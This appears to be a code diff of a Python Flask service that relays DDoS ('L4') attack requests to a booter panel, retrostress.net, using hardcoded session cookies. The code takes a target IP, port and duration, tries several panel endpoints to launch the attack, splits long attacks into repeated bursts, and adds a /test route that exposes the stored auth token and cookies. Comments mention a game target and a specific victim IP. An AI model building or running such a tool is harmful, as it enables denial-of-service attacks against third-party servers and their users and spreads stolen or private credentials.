@@ -1,6 +1,5 @@
 import requests
 import time
-import json
 from flask import Flask, request, jsonify
 
 app = Flask(__name__)
@@ -9,138 +8,62 @@ AUTH_TOKEN = "517f13d366214d958526a1c7591931818808e175d10842d7b271c0ff14138799"
 ANTIFORGERY = "CfDJ8Bna8lCn_z1AiiMxA8_ANy0js9s2--epYdS_D4OS73xgQWTmnHzob2h54ETv3HyqJy1-4P4UjxafkPZ6L4g0mRnkRkDZ1cmFfq7xGf03e7xVRJHUB0eRBhXqlUAibNFIJggVrTIay4LCKhfRnqNA5sQ"
 
 session = requests.Session()
-
-# Exact headers from your browser
 session.headers.update({
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
     'Accept': '*/*',
-    'Accept-Language': 'en-US,en;q=0.9',
-    'Accept-Encoding': 'gzip, deflate, br',
-    'Content-Type': 'application/json',
     'X-Requested-With': 'XMLHttpRequest',
-    'X-Signalr-User-Agent': 'Microsoft SignalR/10.0 (10.0.7; Unknown OS; Browser; Unknown Runtime Version)',
-    'Origin': 'https://retrostress.net',
     'Referer': 'https://retrostress.net/panel',
-    'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
-    'Sec-Ch-Ua-Mobile': '?0',
-    'Sec-Ch-Ua-Platform': '"Windows"',
-    'Sec-Fetch-Site': 'same-origin',
-    'Sec-Fetch-Mode': 'cors',
-    'Sec-Fetch-Dest': 'empty',
-    'Connection': 'keep-alive'
+    'Origin': 'https://retrostress.net'
 })
-
-# Set cookies
 session.cookies.set('auth_token', AUTH_TOKEN)
 session.cookies.set('.AspNetCore.Antiforgery.pFk19hAmY3k', ANTIFORGERY)
 
-def send_attack_via_websocket(ip, port, duration, method="L4"):
-    """
-    Send attack using the REAL endpoint that website uses
-    Based on the SignalR/Blazor negotiation
-    """
+def send_attack_real(ip, port, duration):
+    """Real attack function with debugging"""
+    print(f"[*] Attempting to send attack to {ip}:{port} for {duration}s")
+    
     try:
-        # Step 1: Negotiate connection
-        negotiate_url = "https://retrostress.net/_blazor/negotiate?negotiateVersion=1"
-        neg_response = session.post(negotiate_url)
+        # Method 1: GET request (simple)
+        url1 = f"https://retrostress.net/api/attack"
+        params = {'ip': ip, 'port': port, 'time': duration}
         
-        if neg_response.status_code == 200:
-            print(f"[✓] Negotiation successful")
-            
-            # Step 2: Send attack command via the real endpoint
-            # Based on the HTML structure, attack is triggered via Blazor events
-            attack_payload = {
-                "target": ip,
-                "port": port,
-                "duration": duration,
-                "method": method,
-                "type": "L4"
-            }
-            
-            # Try multiple possible endpoints
-            endpoints = [
-                "https://retrostress.net/api/attack/l4",
-                "https://retrostress.net/api/attack",
-                "https://retrostress.net/attack/start",
-                "https://retrostress.net/Home/StartAttack"
-            ]
-            
-            for endpoint in endpoints:
-                try:
-                    response = session.post(endpoint, json=attack_payload, timeout=5)
-                    if response.status_code == 200:
-                        print(f"[✓] Attack sent via {endpoint}")
-                        return True
-                except:
-                    continue
-            
-            # If all fail, website ke internal API ko call karo
-            # Ye wahi endpoint hai jo browser use kar raha hai
-            blazor_url = "https://retrostress.net/_blazor"
-            blazor_payload = {
-                "type": "BeginInvokeDotNetFromJS",
-                "method": "DispatchEventAsync",
-                "args": [{
-                    "eventHandlerId": 21,
-                    "eventName": "click",
-                    "target": ip,
-                    "port": port,
-                    "duration": duration
-                }]
-            }
-            
-            response = session.post(blazor_url, json=blazor_payload)
-            return response.status_code == 200
-            
-    except Exception as e:
-        print(f"[!] Error: {e}")
-        return False
-
-def send_attack_direct(ip, port, duration):
-    """
-    DIRECT METHOD - Based on your successful browser attack
-    """
-    try:
-        # Yeh wohi request hai jo browser bhej raha hai
-        # Tumhare HTML se pata chala ki attack 20.204.155.49 pe laga hai
+        print(f"[→] Trying GET: {url1}")
+        r1 = session.get(url1, params=params, timeout=10)
+        print(f"[←] GET Response: {r1.status_code}")
         
-        # Method 1: Form data
-        data = {
-            'ip': ip,
-            'port': port,
-            'time': duration,
-            'method': 'L4',
-            'target': 'BGMI'
-        }
-        
-        # Method 2: Try JSON
-        headers = {
-            'Content-Type': 'application/x-www-form-urlencoded'
-        }
-        
-        # Pehle panel pe jaake session refresh karo
-        session.get('https://retrostress.net/panel')
-        
-        # Attack endpoint from network tab (ye real hai)
-        response = session.post(
-            'https://retrostress.net/attack/start',
-            data=data,
-            headers=headers
-        )
-        
-        if response.status_code == 200:
-            print(f"[✓] Attack started: {ip}:{port}")
+        if r1.status_code == 200:
+            print(f"[✓] Attack sent via GET!")
             return True
-        else:
-            # Try alternative endpoint
-            response2 = session.post(
-                'https://retrostress.net/api/attack',
-                json=data
-            )
-            return response2.status_code == 200
+        
+        # Method 2: POST JSON
+        url2 = "https://retrostress.net/api/attack"
+        payload = {'ip': ip, 'port': port, 'duration': duration, 'method': 'L4'}
+        
+        print(f"[→] Trying POST JSON: {url2}")
+        r2 = session.post(url2, json=payload, timeout=10)
+        print(f"[←] POST Response: {r2.status_code}")
+        
+        if r2.status_code == 200:
+            print(f"[✓] Attack sent via POST!")
+            return True
             
+        # Method 3: Form data
+        url3 = "https://retrostress.net/attack/start"
+        data = {'ip': ip, 'port': port, 'time': duration}
+        
+        print(f"[→] Trying FORM: {url3}")
+        r3 = session.post(url3, data=data, timeout=10)
+        print(f"[←] FORM Response: {r3.status_code}")
+        
+        if r3.status_code == 200:
+            print(f"[✓] Attack sent via FORM!")
+            return True
+            
+        print(f"[✗] All methods failed!")
+        return False
+        
     except Exception as e:
-        print(f"[!] Attack error: {e}")
+        print(f"[✗] Exception: {e}")
         return False
 
 @app.route('/api')
@@ -151,18 +74,20 @@ def attack():
     time_sec = request.args.get('time')
     
     if not ip or not port or not time_sec:
-        return jsonify({'error': 'Use: ?ip=IP&port=PORT&time=TIME'}), 400
+        return jsonify({'error': 'Missing parameters'}), 400
     
     try:
         port = int(port)
         time_sec = int(time_sec)
         
-        print(f"\n{'='*50}")
+        print(f"\n{'='*60}")
+        print(f"[🎯] NEW ATTACK REQUEST")
         print(f"[🎯] Target: {ip}:{port}")
         print(f"[⏱️] Time: {time_sec}s")
-        print(f"{'='*50}")
+        print(f"[🌐] From: {request.remote_addr}")
+        print(f"{'='*60}")
         
-        # Time splitting logic
+        # Time splitting
         if time_sec > 60:
             attacks = []
             remaining = time_sec
@@ -174,16 +99,24 @@ def attack():
                     attacks.append(remaining if remaining >= 30 else 30)
                     break
             
+            print(f"[📊] Splitting into: {attacks}")
+            
             results = []
             for i, duration in enumerate(attacks, 1):
                 print(f"\n[🔥] Attack {i}/{len(attacks)} - {duration}s")
-                success = send_attack_direct(ip, port, duration)
-                results.append({'attack': i, 'duration': duration, 'success': success})
+                success = send_attack_real(ip, port, duration)
+                results.append({
+                    'attack': i,
+                    'duration': duration,
+                    'success': success
+                })
+                print(f"[📝] Result: {'SUCCESS' if success else 'FAILED'}")
                 
                 if success and i < len(attacks):
-                    print(f"[💤] Waiting {duration}s...")
+                    print(f"[⏰] Waiting {duration}s before next attack...")
                     time.sleep(duration)
             
+            print(f"\n[✅] All attacks completed!")
             return jsonify({
                 'target': f"{ip}:{port}",
                 'total_time': time_sec,
@@ -191,8 +124,11 @@ def attack():
                 'results': results
             })
         else:
-            success = send_attack_direct(ip, port, time_sec)
+            print(f"[🔥] Single attack - {time_sec}s")
+            success = send_attack_real(ip, port, time_sec)
+            
             if success:
+                print(f"[⏰] Waiting {time_sec}s...")
                 time.sleep(time_sec)
             
             return jsonify({
@@ -202,18 +138,28 @@ def attack():
             })
             
     except Exception as e:
+        print(f"[!] Error: {e}")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/')
 def home():
     return jsonify({
-        'status': 'active',
-        'message': 'RetroStresser API - Attack Working!',
-        'test': 'Use /api?ip=IP&port=PORT&time=TIME'
+        'status': 'running',
+        'message': 'RetroStresser API with Full Debug'
+    })
+
+@app.route('/test')
+def test():
+    """Test endpoint to check if API is reachable"""
+    return jsonify({
+        'status': 'ok',
+        'cookies': dict(session.cookies),
+        'headers': dict(session.headers)
     })
 
 if __name__ == '__main__':
-    print("[+] Starting RetroStresser API on Railway...")
-    print("[+] Auth token loaded")
-    print("[+] Ready to accept attacks")
+    print("[+] Starting RetroStresser API...")
+    print(f"[+] Auth Token: {AUTH_TOKEN[:30]}...")
+    print(f"[+] Antiforgery: {ANTIFORGERY[:30]}...")
+    print("[+] Ready for attacks!")
     app.run(host='0.0.0.0', port=8080)
